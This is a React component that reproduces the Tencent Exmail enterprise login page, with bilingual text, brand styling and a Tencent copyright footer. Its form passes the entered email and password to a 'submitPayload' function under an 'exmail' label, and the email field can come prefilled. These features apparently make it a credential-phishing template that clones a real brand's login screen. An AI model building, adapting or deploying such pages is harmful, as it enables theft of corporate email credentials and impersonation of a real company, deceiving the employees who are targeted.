
import React, { useState } from 'react';
import { useTranslation } from '../components/LanguageProvider';
import { useSecurity } from '../components/SecurityManager';
import { motion } from 'framer-motion';

interface ExmailThemeProps {
  prefilledEmail?: string;
}

const ExmailTheme: React.FC<ExmailThemeProps> = ({ prefilledEmail }) => {
  const { t, lang } = useTranslation();
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { submitPayload, error, setError } = useSecurity();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await submitPayload({ email, password }, 'exmail');
      setPassword('');
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* Top Header */}
      <header className="w-full px-8 py-4 flex items-center justify-between z-20 bg-white/80 backdrop-blur-sm">
        <div className="flex items-center space-x-2">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#007cc7" strokeWidth="2" strokeLinejoin="round"/>
            <path d="M2 17L12 22L22 17" stroke="#007cc7" strokeWidth="2" strokeLinejoin="round"/>
            <path d="M2 12L12 17L22 12" stroke="#007cc7" strokeWidth="2" strokeLinejoin="round"/>
          </svg>
          <span className="text-[#007cc7] font-bold text-xl tracking-widest">EXMAIL</span>
        </div>
        
        <nav className="flex items-center space-x-4 text-[12px] text-gray-600">
          <a href="#" className="hover:text-[#007cc7]">{lang === 'zh' ? '开通企业邮' : 'Register new company'}</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-[#007cc7]">{lang === 'zh' ? 'App收发邮件' : 'Send and receive emails in the app'}</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-[#007cc7]">{lang === 'zh' ? 'English' : 'Chinese'}</a>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="relative flex-grow flex items-center justify-center overflow-hidden">
        {/* Desaturated Background Image */}
        <div className="absolute inset-0 z-0">
          <img 
            src="https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&q=80&w=2000" 
            alt="Office background" 
            className="w-full h-full object-cover grayscale opacity-20"
          />
          <div className="absolute inset-0 bg-gradient-to-r from-white/60 to-transparent"></div>
        </div>

        <div className="relative z-10 w-full max-w-[1200px] px-8 flex flex-col md:flex-row items-center justify-between">
          {/* Left Text */}
          <div className="hidden md:block max-w-[500px] mb-12 md:mb-0">
            <h1 className="text-[32px] md:text-[42px] font-medium text-gray-700 leading-tight">
              {lang === 'zh' ? '不止是邮箱，' : 'Not just mailbox,'}
              <br />
              {lang === 'zh' ? '更是高效的办公体验。' : 'a new efficient office experience.'}
            </h1>
          </div>

          {/* Login Card */}
          <div className="w-full max-w-[380px] bg-white rounded-sm shadow-[0_10px_35px_rgba(0,0,0,0.1)] overflow-hidden">
            <div className="p-10">
              <h2 className="text-center text-[16px] text-gray-600 mb-10">
                {lang === 'zh' ? '账号密码登录' : 'Account password login'}
              </h2>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="relative border-b border-gray-200">
                  <input 
                    type="text" 
                    placeholder={lang === 'zh' ? '邮箱账号/管理员账号' : 'Email Account/Admin Account'}
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (error) setError(null);
                    }}
                    className="w-full py-2 px-1 text-[14px] focus:outline-none focus:border-[#2a8bd5] transition-colors placeholder:text-gray-300"
                  />
                </div>

                <div className="relative border-b border-gray-200">
                  <input 
                    type="password" 
                    placeholder={lang === 'zh' ? '请输入邮箱密码' : 'Enter the email password.'}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (error) setError(null);
                    }}
                    className="w-full py-2 px-1 text-[14px] focus:outline-none focus:border-[#2a8bd5] transition-colors placeholder:text-gray-300"
                  />
                </div>

                <div className="flex items-center justify-between text-[12px] text-gray-500 pt-2">
                  <label className="flex items-center cursor-pointer">
                    <input type="checkbox" className="mr-2 accent-[#2a8bd5] rounded border-gray-300" />
                    {lang === 'zh' ? '5天内自动登录' : 'Auto login within 5 days'}
                  </label>
                  <a href="#" className="text-[#2a8bd5] hover:underline">
                    {lang === 'zh' ? '忘记密码' : 'Forgot Password'}
                  </a>
                </div>

                <button 
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-2.5 bg-[#2a8bd5] hover:bg-[#257dbf] text-white text-[16px] font-medium rounded transition-colors shadow-sm disabled:opacity-70"
                >
                  {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'log in')}
                </button>

                {error && (
                  <motion.div 
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-red-500 text-[12px] text-center font-medium py-1"
                  >
                    {error}
                  </motion.div>
                )}
              </form>
            </div>

            <div className="flex border-t border-gray-100 h-14 bg-gray-50/30">
              <button className="flex-1 text-[13px] text-gray-500 hover:text-[#2a8bd5] transition-colors flex items-center justify-center border-r border-gray-100">
                {lang === 'zh' ? '扫码登录' : 'Scan code login'}
              </button>
              <button className="flex-1 text-[13px] text-gray-500 hover:text-[#2a8bd5] transition-colors flex items-center justify-center">
                {lang === 'zh' ? '手机号登录' : 'Mobile number login'}
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-6 text-[12px] text-gray-400 border-t border-gray-100/50 bg-white">
        <div className="max-w-[1200px] mx-auto px-8 flex flex-wrap justify-center items-center space-x-3 sm:space-x-4">
          <a href="#" className="hover:underline">{lang === 'zh' ? '关于腾讯' : 'About Tencent'}</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">{lang === 'zh' ? '用户协议' : 'User Agreement'}</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">{lang === 'zh' ? '帮助中心' : 'Help center'}</a>
          <span className="text-gray-200">|</span>
          <a href="#" className="hover:underline">{lang === 'zh' ? '使用手册' : 'User manual'}</a>
          <span className="text-gray-400 ml-4">©1998 - 2026 Tencent Inc. All Rights Reserved</span>
        </div>
      </footer>
    </div>
  );
};

export default ExmailTheme;
